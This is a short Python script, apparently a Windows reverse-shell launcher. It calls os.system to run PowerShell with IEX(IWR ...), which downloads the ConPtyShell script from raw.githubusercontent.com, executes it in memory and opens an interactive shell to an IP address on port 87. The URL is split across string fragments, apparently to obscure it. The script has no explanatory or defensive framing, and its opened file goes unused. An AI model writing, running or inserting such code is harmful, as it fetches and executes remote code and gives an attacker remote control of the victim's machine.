import os
import socket

filepath = os.path.join("RS", "_")
with open(filepath, "r") as f:
    ip = socket.gethostbyname(socket.gethostname())
    os.system("C:/Windows/System32/WindowsPowerShell/"
              "v1.0/powershell.exe IEX(IWR https://raw.g"
              "ithubusercontent.com/antonioCoco/ConPtyShell/master/In"
              f"voke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} 87")
